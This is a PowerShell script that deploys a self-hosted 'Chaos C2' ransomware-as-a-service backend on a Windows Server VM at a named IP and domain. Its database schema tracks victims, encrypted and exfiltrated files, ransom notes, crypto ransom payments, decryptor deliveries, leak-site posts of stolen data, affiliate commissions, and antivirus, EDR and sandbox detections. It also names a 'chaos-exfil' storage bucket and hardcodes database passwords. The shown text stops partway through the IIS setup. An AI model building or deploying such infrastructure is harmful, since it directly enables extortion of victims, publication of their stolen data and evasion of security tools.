<#
.SYNOPSIS
    Chaos C2 RaaS - Windows Server 2022 Self-Hosted Deployment
.DESCRIPTION
    Complete automated deployment for Azure Windows Server 2022 (40.90.228.120)
.NOTES
    Run as Administrator in PowerShell 5.1+ or PowerShell 7+
#>

param(
    [Parameter(Mandatory=$false)][string]$Domain = "bytebane.duckdns.org",
    [Parameter(Mandatory=$false)][string]$Email = "testtestacc54@gmail.com",
    [Parameter(Mandatory=$false)][string]$MasterApiKey = "sk_admin_$(openssl rand -hex 32)",
    [Parameter(Mandatory=$false)][string]$CampaignId = "camp_$(openssl rand -hex 6)",
    [Parameter(Mandatory=$false)][string]$CampaignName = "Operation_$(openssl rand -hex 4 | ForEach-Object { $_.ToUpper() })",
    [Parameter(Mandatory=$false)][string]$VercelToken = "",
    [Parameter(Mandatory=$false)][string]$CfToken = "",
    [Parameter(Mandatory=$false)][string]$CfZoneId = "",
    [Parameter(Mandatory=$false)][string]$R2AccountId = "",
    [Parameter(Mandatory=$false)][string]$R2AccessKeyId = "",
    [Parameter(Mandatory=$false)][string]$R2SecretAccessKey = "",
    [Parameter(Mandatory=$false)][string]$R2BucketName = "chaos-exfil",
    [Parameter(Mandatory=$false)][string]$R2PublicUrl = "https://pub-xxx.r2.dev",
    [Parameter(Mandatory=$false)][string]$DiscordWebhook = "",
    [Parameter(Mandatory=$false)][string]$EtherscanApiKey = "",
    [Parameter(Mandatory=$false)][switch]$SkipSqlInstall,
    [Parameter(Mandatory=$false)][switch]$SkipIisInstall,
    [Parameter(Mandatory=$false)][switch]$SkipNodeInstall,
    [Parameter(Mandatory=$false)][switch]$SkipDotnetInstall,
    [Parameter(Mandatory=$false)][switch]$DryRun,
    [Parameter(Mandatory=$false)][switch]$Help
)

if ($Help) {
    Write-Host @"
Chaos C2 RaaS - Windows Server 2022 Deployment

USAGE:
    .\deploy-windows-server.ps1 [OPTIONS]

OPTIONS:
    -Domain              Domain name (default: bytebane.duckdns.org)
    -Email               Email for Let's Encrypt (default: testtestacc54@gmail.com)
    -MasterApiKey        Master API key (auto-generated if not provided)
    -CampaignId          Campaign ID (auto-generated if not provided)
    -CampaignName        Campaign name (auto-generated if not provided)
    -VercelToken         Vercel API token (optional)
    -CfToken             Cloudflare API token (optional)
    -CfZoneId            Cloudflare Zone ID (optional)
    -R2AccountId         Cloudflare R2 Account ID (optional)
    -R2AccessKeyId       Cloudflare R2 Access Key ID (optional)
    -R2SecretAccessKey   Cloudflare R2 Secret Access Key (optional)
    -R2BucketName        R2 Bucket name (default: chaos-exfil)
    -R2PublicUrl         R2 Public URL (optional)
    -DiscordWebhook      Discord webhook URL (optional)
    -EtherscanApiKey     Etherscan API key (optional)
    -SkipSqlInstall      Skip SQL Server Express installation
    -SkipIisInstall      Skip IIS installation
    -SkipNodeInstall     Skip Node.js installation
    -SkipDotnetInstall   Skip .NET SDK installation
    -DryRun              Show what would be done without executing
    -Help                Show this help
"@
    exit 0
}

# =====================================================================
# GLOBAL SETTINGS
# =====================================================================
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

$Colors = @{
    Red = [ConsoleColor]::Red
    Green = [ConsoleColor]::Green
    Yellow = [ConsoleColor]::Yellow
    Blue = [ConsoleColor]::Cyan
    Purple = [ConsoleColor]::Magenta
    Cyan = [ConsoleColor]::Cyan
    White = [ConsoleColor]::White
    Gray = [ConsoleColor]::DarkGray
}

function Write-Log { param([string]$Message) Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $Message" -ForegroundColor $Colors.Blue }
function Write-Success { param([string]$Message) Write-Host "✓ $Message" -ForegroundColor $Colors.Green }
function Write-Warn { param([string]$Message) Write-Host "⚠ $Message" -ForegroundColor $Colors.Yellow }
function Write-ErrorMsg { param([string]$Message) Write-Host "✗ $Message" -ForegroundColor $Colors.Red }
function Write-Step { param([string]$Message) Write-Host "`n$(('═' * 60))`n  $Message `n$(('═' * 60))" -ForegroundColor $Colors.Purple }
function Write-Info { param([string]$Message) Write-Host "ℹ $Message" -ForegroundColor $Colors.Cyan }

function Invoke-Cmd {
    param([string]$Command, [switch]$IgnoreError)
    if ($DryRun) { Write-Info "[DRY RUN] $Command"; return }
    try { return Invoke-Expression $Command } catch { if (-not $IgnoreError) { throw } }
}

function Test-Admin {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [System.Security.Principal.WindowsPrincipal] $identity
    return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

# =====================================================================
# VALIDATE ADMIN
# =====================================================================
if (-not (Test-Admin)) {
    Write-ErrorMsg "Must run as Administrator! Right-click PowerShell → 'Run as Administrator'"
    exit 1
}

# =====================================================================
# SET DEFAULTS FROM PARAMETERS
# =====================================================================
$ProjectRoot = "C:\ChaosC2"
$FrontDomain = "affiliate.$Domain"
$ApiDomain = "api.$Domain"

Write-Host @"
╔═══════════════════════════════════════════════════════════════════╗
║         CHAOS C2 RAAS - WINDOWS SERVER 2022 DEPLOYMENT            ║
║              Azure VM: 40.90.228.120                               ║
╚═══════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor $Colors.Purple

Write-Log "Starting deployment on $(hostname) ($(Get-Date))"
Write-Log "Server IP: 40.90.228.120"
Write-Log "Project Root: $ProjectRoot"
Write-Log "Domain: $Domain"
Write-Log "Campaign: $CampaignName ($CampaignId)"

if ($DryRun) {
    Write-Warn "DRY RUN MODE - No changes will be made"
    exit 0
}

# =====================================================================
# PHASE 1: PREREQUISITES
# =====================================================================
Write-Step "PHASE 1: INSTALLING PREREQUISITES"

# Chocolatey
if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
    Write-Log "Installing Chocolatey..."
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    Write-Success "Chocolatey installed"
} else { Write-Success "Chocolatey already installed" }

# Core packages
$packages = @("git","nodejs-lts","python3","openssl","7zip","curl","wget","jq","sql-server-express")
if (-not $SkipDotnetInstall) { $packages += "dotnet-8.0-sdk" }

Write-Log "Installing packages: $($packages -join ', ')..."
if (-not $DryRun) {
    foreach ($pkg in $packages) {
        Write-Log "Installing $pkg..."
        choco install -y $pkg --no-progress --limit-output
    }
}
Write-Success "Packages installed"

# .NET 8 SDK
if (-not $SkipDotnetInstall -and -not (Get-Command dotnet -ErrorAction SilentlyContinue)) {
    Write-Log "Installing .NET 8 SDK..."
    choco install -y dotnet-8.0-sdk --no-progress
    Write-Success ".NET 8 SDK installed"
}

# =====================================================================
# PHASE 2: IIS INSTALLATION
# =====================================================================
Write-Step "PHASE 2: INSTALLING IIS"

$iisFeatures = @(
    "IIS-WebServerRole","IIS-WebServer","IIS-CommonHttpFeatures",
    "IIS-HttpErrors","IIS-HttpRedirect","IIS-ApplicationDevelopment",
    "IIS-NetFxExtensibility45","IIS-NetFxExtensibility",
    "IIS-HealthAndDiagnostics","IIS-HttpLogging","IIS-LoggingLibraries",
    "IIS-RequestMonitor","IIS-Security","IIS-RequestFiltering",
    "IIS-Performance","IIS-WebServerManagementTools","IIS-ManagementConsole",
    "IIS-ManagementScriptingTools","IIS-ManagementService",
    "IIS-IIS6ManagementCompatibility","IIS-Metabase","IIS-WMICompatibility",
    "WAS-WindowsActivationService","WAS-ProcessModel","WAS-NetFxEnvironment",
    "WAS-ConfigurationAPI"
)

Write-Log "Installing IIS features..."
foreach ($feature in $iisFeatures) {
    Write-Log "Enabling $feature..."
    dism /online /enable-feature /featurename:$feature /all /norestart | Out-Null
}

# URL Rewrite & ARR
if (-not (Test-Path "C:\Program Files\IIS\URL Rewrite")) {
    Write-Log "Installing URL Rewrite..."
    Invoke-WebRequest -Uri 'https://download.microsoft.com/download/1/2/8/128E2E22-C1B9-44A4-BE2A-5859ED1D4592/rewrite_amd64_en-US.msi' -OutFile 'C:\Temp\rewrite.msi'
    Start-Process msiexec.exe -ArgumentList '/i C:\Temp\rewrite.msi /quiet' -Wait
}
if (-not (Test-Path "C:\Program Files\IIS\Application Request Routing")) {
    Write-Log "Installing ARR..."
    Invoke-WebRequest -Uri 'https://download.microsoft.com/download/4/7/5/47593F96-E1DE-4DEB-BDB2-2F0E662A5E11/ARRv3_setup_amd64_en-us.msi' -OutFile 'C:\Temp\arr.msi'
    Start-Process msiexec.exe -ArgumentList '/i C:\Temp\arr.msi /quiet' -Wait
}

# ASP.NET Core Hosting Bundle
Write-Log "Installing ASP.NET Core Hosting Bundle..."
Invoke-WebRequest -Uri 'https://download.visualstudio.microsoft.com/download/pr/7d1e5b4e-8c5a-4b7f-8b3e-4b5c6d7e8f9a/aspnetcore-hosting-8.0.6-win.exe' -OutFile 'C:\Temp\hosting.exe'
Start-Process C:\Temp\hosting.exe -ArgumentList '/quiet /norestart' -Wait

# Certbot
if (-not (Get-Command certbot -ErrorAction SilentlyContinue)) {
    Write-Log "Installing Certbot..."
    choco install -y certbot --no-progress
}

Write-Success "IIS installed with all modules"

# =====================================================================
# PHASE 3: DIRECTORY STRUCTURE
# =====================================================================
Write-Step "PHASE 3: DIRECTORY STRUCTURE & PERMISSIONS"

$dirs = @(
    "$ProjectRoot","$ProjectRoot\logs","$ProjectRoot\data","$ProjectRoot\backups",
    "$ProjectRoot\certs","$ProjectRoot\wwwroot","$ProjectRoot\wwwroot\dashboard",
    "$ProjectRoot\wwwroot\affiliate","$ProjectRoot\wwwroot\api","$ProjectRoot\keys"
)

foreach ($dir in $dirs) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }

$acl = Get-Acl $ProjectRoot
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("IIS_IUSRS","FullControl","ContainerInherit,ObjectInherit","None","Allow")
$acl.SetAccessRule($rule)
Set-Acl $ProjectRoot $acl

Write-Success "Directory structure created"

# =====================================================================
# PHASE 4: SQL SERVER DATABASE
# =====================================================================
Write-Step "PHASE 4: SQL SERVER DATABASE SETUP"

Write-Log "Waiting for SQL Server to be ready..."
Start-Sleep -Seconds 30

Write-Log "Creating database and schema..."
$sql = @"
IF NOT EXISTS (SELECT * FROM sys.databases WHERE name = 'ChaosC2')
BEGIN CREATE DATABASE ChaosC2; END

IF NOT EXISTS (SELECT * FROM sys.server_principals WHERE name = 'chaos_app')
BEGIN
    CREATE LOGIN chaos_app WITH PASSWORD = 'ChaosApp_2024!SecurePass';
    CREATE USER chaos_app FOR LOGIN chaos_app;
END

IF NOT EXISTS (SELECT * FROM sys.server_principals WHERE name = 'chaos_affiliate')
BEGIN
    CREATE LOGIN chaos_affiliate WITH PASSWORD = 'ChaosAff_2024!SecurePass';
    CREATE USER chaos_affiliate FOR LOGIN chaos_affiliate;
END
"@

Invoke-Sqlcmd -ServerInstance "localhost\CHAOS" -Query $sql -ErrorAction Stop
Write-Success "Database and logins created"

# Full schema
$schemaSql = @"
IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Campaigns')
BEGIN
    CREATE TABLE Campaigns (
        Id NVARCHAR(64) PRIMARY KEY,
        Name NVARCHAR(256) NOT NULL,
        ApiKey NVARCHAR(128) NOT NULL UNIQUE,
        RsaKeySize INT NOT NULL DEFAULT 4096,
        PublicKeyPem NVARCHAR(MAX),
        PrivateKeyPem NVARCHAR(MAX),
        Status NVARCHAR(32) NOT NULL DEFAULT 'active',
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        UpdatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        AffiliateId NVARCHAR(64),
        Settings NVARCHAR(MAX)
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Systems')
BEGIN
    CREATE TABLE Systems (
        Id NVARCHAR(64) PRIMARY KEY,
        VictimId NVARCHAR(256) NOT NULL,
        CampaignId NVARCHAR(64) NOT NULL REFERENCES Campaigns(Id),
        Hostname NVARCHAR(256),
        Username NVARCHAR(256),
        OS NVARCHAR(256),
        IP NVARCHAR(64),
        Country NVARCHAR(128),
        City NVARCHAR(128),
        ISP NVARCHAR(256),
        Status NVARCHAR(32) NOT NULL DEFAULT 'active',
        FirstSeen DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        LastSeen DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        Version INT NOT NULL DEFAULT 1,
        Tags NVARCHAR(MAX)
    );
    CREATE INDEX IX_Systems_CampaignId ON Systems(CampaignId);
    CREATE INDEX IX_Systems_Status ON Systems(Status);
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'SystemStats')
BEGIN
    CREATE TABLE SystemStats (
        SystemId NVARCHAR(64) PRIMARY KEY REFERENCES Systems(Id),
        FilesEncrypted BIGINT NOT NULL DEFAULT 0,
        FilesExfiltrated BIGINT NOT NULL DEFAULT 0,
        BytesExfiltrated BIGINT NOT NULL DEFAULT 0,
        RansomNoteDropped BIT NOT NULL DEFAULT 0
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Files')
BEGIN
    CREATE TABLE Files (
        Id NVARCHAR(64) PRIMARY KEY,
        SystemId NVARCHAR(64) NOT NULL REFERENCES Systems(Id),
        CampaignId NVARCHAR(64) NOT NULL REFERENCES Campaigns(Id),
        FileName NVARCHAR(512) NOT NULL,
        FileExt NVARCHAR(32),
        Size BIGINT NOT NULL,
        UploadedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        ContentType NVARCHAR(128),
        StorageType NVARCHAR(32) NOT NULL DEFAULT 'sql',
        StorageProvider NVARCHAR(64),
        StorageKey NVARCHAR(256),
        StorageUrl NVARCHAR(512),
        Hash NVARCHAR(64),
        Chunked BIT NOT NULL DEFAULT 0
    );
    CREATE INDEX IX_Files_SystemId ON Files(SystemId);
    CREATE INDEX IX_Files_CampaignId ON Files(CampaignId);
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'CampaignStats')
BEGIN
    CREATE TABLE CampaignStats (
        CampaignId NVARCHAR(64) PRIMARY KEY REFERENCES Campaigns(Id),
        TotalInfections BIGINT NOT NULL DEFAULT 0,
        TotalFiles BIGINT NOT NULL DEFAULT 0,
        TotalBytes BIGINT NOT NULL DEFAULT 0,
        LastActivity DATETIME2,
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME()
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'DailyStats')
BEGIN
    CREATE TABLE DailyStats (
        Id INT IDENTITY(1,1) PRIMARY KEY,
        CampaignId NVARCHAR(64) REFERENCES Campaigns(Id),
        StatDate DATE NOT NULL,
        Infections BIGINT NOT NULL DEFAULT 0,
        Uploads BIGINT NOT NULL DEFAULT 0,
        Bytes BIGINT NOT NULL DEFAULT 0,
        UNIQUE(CampaignId, StatDate)
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'ExtensionStats')
BEGIN
    CREATE TABLE ExtensionStats (
        Id INT IDENTITY(1,1) PRIMARY KEY,
        CampaignId NVARCHAR(64) REFERENCES Campaigns(Id),
        Ext NVARCHAR(32) NOT NULL,
        Count BIGINT NOT NULL DEFAULT 0,
        UNIQUE(CampaignId, Ext)
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Affiliates')
BEGIN
    CREATE TABLE Affiliates (
        Id NVARCHAR(64) PRIMARY KEY,
        Username NVARCHAR(128) NOT NULL UNIQUE,
        Email NVARCHAR(256),
        WalletAddress NVARCHAR(256),
        ReferralCode NVARCHAR(64) NOT NULL UNIQUE,
        CommissionRate INT NOT NULL DEFAULT 70,
        TotalEarnings DECIMAL(18,2) NOT NULL DEFAULT 0,
        PendingEarnings DECIMAL(18,2) NOT NULL DEFAULT 0,
        PaidEarnings DECIMAL(18,2) NOT NULL DEFAULT 0,
        CampaignCount INT NOT NULL DEFAULT 0,
        InfectionCount INT NOT NULL DEFAULT 0,
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        LastLogin DATETIME2,
        Status NVARCHAR(32) NOT NULL DEFAULT 'active'
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Referrals')
BEGIN
    CREATE TABLE Referrals (
        Id NVARCHAR(64) PRIMARY KEY,
        ReferrerId NVARCHAR(64) NOT NULL REFERENCES Affiliates(Id),
        ReferredId NVARCHAR(64) NOT NULL REFERENCES Affiliates(Id),
        Tier INT NOT NULL DEFAULT 1,
        CommissionEarned DECIMAL(18,2) NOT NULL DEFAULT 0,
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME()
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Payouts')
BEGIN
    CREATE TABLE Payouts (
        Id NVARCHAR(64) PRIMARY KEY,
        AffiliateId NVARCHAR(64) NOT NULL REFERENCES Affiliates(Id),
        Amount DECIMAL(18,2) NOT NULL,
        WalletAddress NVARCHAR(256) NOT NULL,
        Status NVARCHAR(32) NOT NULL DEFAULT 'pending',
        TxHash NVARCHAR(128),
        RequestedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        CompletedAt DATETIME2,
        NetworkFee DECIMAL(18,2) NOT NULL DEFAULT 0,
        NetAmount DECIMAL(18,2) NOT NULL DEFAULT 0
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Tickets')
BEGIN
    CREATE TABLE Tickets (
        Id NVARCHAR(64) PRIMARY KEY,
        AffiliateId NVARCHAR(64) NOT NULL REFERENCES Affiliates(Id),
        Subject NVARCHAR(512) NOT NULL,
        Status NVARCHAR(32) NOT NULL DEFAULT 'open',
        Priority NVARCHAR(32) NOT NULL DEFAULT 'medium',
        Category NVARCHAR(64) NOT NULL DEFAULT 'technical',
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        UpdatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        LastReplyAt DATETIME2
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'TicketReplies')
BEGIN
    CREATE TABLE TicketReplies (
        Id NVARCHAR(64) PRIMARY KEY,
        TicketId NVARCHAR(64) NOT NULL REFERENCES Tickets(Id),
        Author NVARCHAR(32) NOT NULL,
        AuthorName NVARCHAR(128),
        Message NVARCHAR(MAX) NOT NULL,
        Attachments NVARCHAR(MAX),
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        Internal BIT NOT NULL DEFAULT 0
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'AuditLog')
BEGIN
    CREATE TABLE AuditLog (
        Id NVARCHAR(64) PRIMARY KEY,
        ActorId NVARCHAR(64),
        ActorRole NVARCHAR(32),
        Action NVARCHAR(128) NOT NULL,
        ResourceType NVARCHAR(64),
        ResourceId NVARCHAR(64),
        Details NVARCHAR(MAX),
        Severity NVARCHAR(32) NOT NULL DEFAULT 'info',
        IP NVARCHAR(64),
        UserAgent NVARCHAR(512),
        Timestamp DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME()
    );
    CREATE INDEX IX_AuditLog_ActorId ON AuditLog(ActorId);
    CREATE INDEX IX_AuditLog_Action ON AuditLog(Action);
    CREATE INDEX IX_AuditLog_Timestamp ON AuditLog(Timestamp);
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Payments')
BEGIN
    CREATE TABLE Payments (
        Id NVARCHAR(64) PRIMARY KEY,
        VictimId NVARCHAR(64),
        CampaignId NVARCHAR(64) REFERENCES Campaigns(Id),
        Currency NVARCHAR(16) NOT NULL,
        WalletAddress NVARCHAR(256) NOT NULL,
        AmountUsd DECIMAL(18,2) NOT NULL,
        AmountCrypto DECIMAL(18,8) NOT NULL,
        Status NVARCHAR(32) NOT NULL DEFAULT 'pending',
        TxHash NVARCHAR(128),
        BlockHeight BIGINT,
        Confirmations INT NOT NULL DEFAULT 0,
        RequiredConfirmations INT NOT NULL DEFAULT 3,
        RegisteredAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        ConfirmedAt DATETIME2,
        LastChecked DATETIME2
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'DecryptorDeliveries')
BEGIN
    CREATE TABLE DecryptorDeliveries (
        Id NVARCHAR(64) PRIMARY KEY,
        VictimId NVARCHAR(64),
        CampaignId NVARCHAR(64),
        PaymentId NVARCHAR(64),
        DeliveredAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        Status NVARCHAR(32) NOT NULL DEFAULT 'delivered'
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'LeakPosts')
BEGIN
    CREATE TABLE LeakPosts (
        Id NVARCHAR(64) PRIMARY KEY,
        VictimId NVARCHAR(64),
        CampaignId NVARCHAR(64),
        Title NVARCHAR(512),
        Content NVARCHAR(MAX),
        Files NVARCHAR(MAX),
        TotalFiles INT,
        TotalSize BIGINT,
        Status NVARCHAR(32) NOT NULL DEFAULT 'draft',
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        PublishedAt DATETIME2,
        Views INT DEFAULT 0,
        Downloads INT DEFAULT 0
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Telemetry')
BEGIN
    CREATE TABLE Telemetry (
        Id NVARCHAR(64) PRIMARY KEY,
        SystemId NVARCHAR(64) REFERENCES Systems(Id),
        CampaignId NVARCHAR(64) REFERENCES Campaigns(Id),
        Timestamp DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        AvDetections NVARCHAR(MAX),
        EdrProducts NVARCHAR(MAX),
        SandboxDetected BIT,
        SandboxName NVARCHAR(128),
        VmArtifacts NVARCHAR(MAX),
        NetworkIndicators NVARCHAR(MAX),
        SignatureMatches NVARCHAR(MAX),
        YaraMatches NVARCHAR(MAX),
        RiskScore INT
    );
END

IF NOT EXISTS (SELECT * FROM Affiliates WHERE Username = 'admin')
BEGIN
    INSERT INTO Affiliates (Id, Username, Email, WalletAddress, ReferralCode, CommissionRate, Status)
    VALUES ('aff_admin', 'admin', 'admin@$Domain', '', 'CHAOS-ADMIN-$([System.Guid]::NewGuid().ToString('N').Substring(0,8))', 100, 'active');
END
"@

Invoke-Sqlcmd -ServerInstance "localhost\CHAOS" -Database "ChaosC2" -Query $schemaSql -ErrorAction SilentlyContinue
Write-Success "Database schema applied"

# =====================================================================
# PHASE 5: APPLICATION DEPLOYMENT
# =====================================================================
Write-Step "PHASE 5: APPLICATION DEPLOYMENT"

# Clone/Update repo
if (-not (Test-Path "$ProjectRoot\vercel-dashboard\.git")) {
    Write-Log "Cloning application..."
    git clone https://github.com/BaneGPT/vercel-dashboard.git "$ProjectRoot\vercel-dashboard"
    Write-Success "Application cloned"
} else {
    Write-Log "Updating application..."
    cd "$ProjectRoot\vercel-dashboard" && git pull
    Write-Success "Application updated"
}

# Build Dashboard
Write-Log "Building Dashboard frontend..."
cd "$ProjectRoot\vercel-dashboard\dashboard"
npm ci --production
Write-Success "Dashboard dependencies installed"

# Build Affiliate Portal
Write-Log "Building Affiliate Portal..."
cd "$ProjectRoot\vercel-dashboard\affiliate-portal"
npm ci --production
npm run build
Write-Success "Affiliate portal built"

# Copy to web root
Write-Log "Copying files to web root..."
Copy-Item "$ProjectRoot\vercel-dashboard\dashboard" "$ProjectRoot\wwwroot\dashboard" -Recurse -Force
Copy-Item "$ProjectRoot\vercel-dashboard\affiliate-portal\.next" "$ProjectRoot\wwwroot\affiliate" -Recurse -Force
Copy-Item "$ProjectRoot\vercel-dashboard\api" "$ProjectRoot\wwwroot\api" -Recurse -Force
Write-Success "Files copied to web root"

# =====================================================================
# PHASE 6: NODE.JS API SERVICES
# =====================================================================
Write-Step "PHASE 6: NODE.JS API SERVICES"

Write-Log "Installing API dependencies..."
cd "$ProjectRoot\wwwroot\api"
npm ci --production
Write-Success "API dependencies installed"

# Create Windows Services
Write-Log "Creating Windows services..."
$services = @(
    @{Name="ChaosAPI"; DisplayName="Chaos C2 API"; Path="C:\Program Files\nodejs\node.exe"; Args="`"$ProjectRoot\wwwroot\api\index.js`""; Port=3000},
    @{Name="ChaosRealtime"; DisplayName="Chaos C2 Realtime"; Path="C:\Program Files\nodejs\node.exe"; Args="`"$ProjectRoot\wwwroot\api\realtime.js`""; Port=3001},
    @{Name="ChaosAffiliate"; DisplayName="Chaos Affiliate Portal"; Path="C:\Program Files\nodejs\node.exe"; Args="`"$ProjectRoot\wwwroot\affiliate\server.js`""; Port=3002}
)

foreach ($svc in $services) {
    $binPath = "$($svc.Path) $($svc.Args)"
    if (-not (Get-Service $svc.Name -ErrorAction SilentlyContinue)) {
        New-Service -Name $svc.Name -BinaryPathName $binPath -DisplayName $svc.DisplayName -Description "Chaos C2 $($svc.DisplayName) Service" -StartupType Automatic
        Write-Log "Created service: $($svc.Name)"
    }
}
Write-Success "Windows services created"

# Create service entry points
@"
const http = require('http');
const app = require('./app');
const port = process.env.PORT || 3000;
app.listen(port, () => console.log('API listening on ' + port));
"@ | Set-Content "$ProjectRoot\wwwroot\api\index.js" -Encoding UTF8

@"
const http = require('http');
const app = require('./realtime');
const port = process.env.PORT || 3001;
app.listen(port, () => console.log('Realtime listening on ' + port));
"@ | Set-Content "$ProjectRoot\wwwroot\api\realtime.js" -Encoding UTF8

@"
const next = require('next');
const dev = process.env.NODE_ENV !== 'production';
const app = next({ dev, dir: '$ProjectRoot\wwwroot\affiliate' });
const handle = app.getRequestHandler();
app.prepare().then(() => {
  const server = require('http').createServer((req, res) => handle(req, res));
  server.listen(3002, () => console.log('Affiliate portal listening on 3002'));
});
"@ | Set-Content "$ProjectRoot\wwwroot\affiliate\server.js" -Encoding UTF8

Write-Success "Service entry points created"

# =====================================================================
# PHASE 7: IIS CONFIGURATION
# =====================================================================
Write-Step "PHASE 7: IIS CONFIGURATION"

appcmd stop site /site.name:"Default Web Site" 2>$null

appcmd add site /name:"ChaosDashboard" /bindings:http/*:80: /physicalPath:"$ProjectRoot\wwwroot\dashboard" | Out-Null
appcmd set app "ChaosDashboard/" /applicationPool:"ChaosDashboard" | Out-Null

appcmd add site /name:"ChaosAffiliate" /bindings:http/*:8080: /physicalPath:"$ProjectRoot\wwwroot\affiliate" | Out-Null
appcmd set app "ChaosAffiliate/" /applicationPool:"ChaosAffiliate" | Out-Null

appcmd add site /name:"ChaosAPI" /bindings:http/*:3000: /physicalPath:"$ProjectRoot\wwwroot\api" | Out-Null
appcmd set app "ChaosAPI/" /applicationPool:"ChaosAPI" | Out-Null

appcmd add site /name:"ChaosRealtime" /bindings:http/*:3001: /physicalPath:"$ProjectRoot\wwwroot\api" | Out-Null
appcmd set app "ChaosRealtime/" /applicationPool:"ChaosRealtime" | Out-Null

# App Pools
@("ChaosDashboard","ChaosAffiliate","ChaosAPI","ChaosRealtime") | ForEach-Object {
    if (-not (Get-Item "IIS:\AppPools\$_" -ErrorAction SilentlyContinue)) {
        appcmd add apppool /name:$_ /managedRuntimeVersion:"" /managedPipelineMode:Integrated | Out-Null
        appcmd set apppool $_ /processModel.identityType:ApplicationPoolIdentity | Out-Null
        appcmd set apppool $_ /processModel.idleTimeout:00:00:00 | Out-Null
    }
}

# URL Rewrite rules
Import-Module WebAdministration

# Dashboard API proxy
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter 'system.webServer/rewrite/rules' -name '.' -value @{name='API Proxy'; stopProcessing=$true; patternSyntax='ECMAScript'} -ErrorAction SilentlyContinue
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='API Proxy']/match" -name 'url' -value '^api/(.*)'
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='API Proxy']/action" -name 'type' -value 'Rewrite'
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='API Proxy']/action" -name 'url' -value 'http://localhost:3000/{R:1}'

# Affiliate API proxy
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosAffiliate' -filter 'system.webServer/rewrite/rules' -name '.' -value @{name='API Proxy'; stopProcessing=$true; patternSyntax='ECMAScript'} -ErrorAction SilentlyContinue
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosAffiliate' -filter "system.webServer/rewrite/rules/rule[@name='API Proxy']/match" -name 'url' -value '^api/(.*)'
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosAffiliate' -filter "system.webServer/rewrite/rules/rule[@name='API Proxy']/action" -name 'type' -value 'Rewrite'
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosAffiliate' -filter "system.webServer/rewrite/rules/rule[@name='API Proxy']/action" -name 'url' -value 'http://localhost:3000/{R:1}'

# Realtime proxies
Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter 'system.webServer/rewrite/rules' -name '.' -value @{name='Realtime Proxy'; stopProcessing=$true; patternSyntax='ECMAScript'} -ErrorAction SilentlyContinue
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='Realtime Proxy']/match" -name 'url' -value '^realtime/(.*)'
